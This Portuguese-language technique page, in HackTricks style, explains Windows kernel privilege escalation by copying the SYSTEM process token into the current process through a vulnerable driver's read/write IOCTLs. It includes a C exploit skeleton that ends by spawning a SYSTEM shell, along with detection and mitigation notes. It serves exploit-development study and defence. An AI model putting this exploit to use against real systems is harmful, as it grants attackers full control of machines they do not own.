# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Se um driver vulnerável expõe um IOCTL que dá a um atacante primitivos arbitrários de leitura e/ou escrita no kernel, a elevação para NT AUTHORITY\SYSTEM costuma ser alcançada roubando um SYSTEM access token. A técnica copia o ponteiro Token do EPROCESS de um processo SYSTEM para o EPROCESS do processo atual.

Por que funciona:
- Cada processo tem uma estrutura EPROCESS que contém (entre outros campos) um Token (na verdade um EX_FAST_REF para um objeto token).
- O processo SYSTEM (PID 4) possui um token com todos os privilégios habilitados.
- Substituir o EPROCESS.Token do processo atual pelo ponteiro do token do SYSTEM faz com que o processo atual passe a rodar como SYSTEM imediatamente.

> Offsets em EPROCESS variam entre versões do Windows. Determine-os dinamicamente (symbols) ou use constantes específicas da versão. Lembre-se também que EPROCESS.Token é um EX_FAST_REF (os 3 bits menos significativos são flags de contagem de referência).

## Passos em alto nível

1) Localize a base de ntoskrnl.exe e resolva o endereço de PsInitialSystemProcess.
- Do modo usuário, use NtQuerySystemInformation(SystemModuleInformation) ou EnumDeviceDrivers para obter as bases dos drivers carregados.
- Some o offset de PsInitialSystemProcess (a partir de símbolos/reversing) à base do kernel para obter seu endereço.
2) Leia o ponteiro em PsInitialSystemProcess → este é um ponteiro do kernel para o EPROCESS do SYSTEM.
3) A partir do EPROCESS do SYSTEM, leia os offsets UniqueProcessId e ActiveProcessLinks para percorrer a lista duplamente ligada de estruturas EPROCESS (ActiveProcessLinks.Flink/Blink) até encontrar o EPROCESS cujo UniqueProcessId é igual a GetCurrentProcessId(). Mantenha ambos:
- EPROCESS_SYSTEM (do SYSTEM)
- EPROCESS_SELF (do processo atual)
4) Leia o valor do token do SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Mascarar os 3 bits menos significativos: Token_SYS_masked = Token_SYS & ~0xF (comumente ~0xF ou ~0x7 dependendo do build; em x64 os 3 bits menos significativos são usados — máscara 0xFFFFFFFFFFFFFFF8).
5) Opção A (mais comum): Preserve os 3 bits menos significativos do seu token atual e os combine com o ponteiro do SYSTEM para manter a contagem de referência embutida consistente.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Escreva Token_NEW de volta em (EPROCESS_SELF + TokenOffset) usando seu primitivo de escrita no kernel.
7) Seu processo atual agora é SYSTEM. Opcionalmente, spawn um novo cmd.exe ou powershell.exe para confirmar.

## Pseudocódigo

Abaixo está um esqueleto que usa apenas dois IOCTLs de um driver vulnerável, um para leitura de 8 bytes no kernel e outro para escrita de 8 bytes no kernel. Substitua pela interface do seu driver.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notas:
- Offsets: Use WinDbg’s `dt nt!_EPROCESS` with the target’s PDBs, or a runtime symbol loader, to get correct offsets. Não use valores codificados de forma cega.
- Mask: On x64 the token is an EX_FAST_REF; low 3 bits are reference count bits. Manter os bits inferiores originais do seu token evita inconsistências imediatas na contagem de referências.
- Stability: Prefira elevar o processo atual; se você elevar um helper de curta duração pode perder SYSTEM quando ele terminar.

## Detecção e mitigação
- Carregar drivers de terceiros não assinados ou não confiáveis que exponham IOCTLs poderosos é a causa raiz.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard e as regras de Attack Surface Reduction podem impedir que drivers vulneráveis sejam carregados.
- EDR pode monitorar sequências de IOCTL suspeitas que implementem arbitrary read/write e token swaps.

## Referências
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
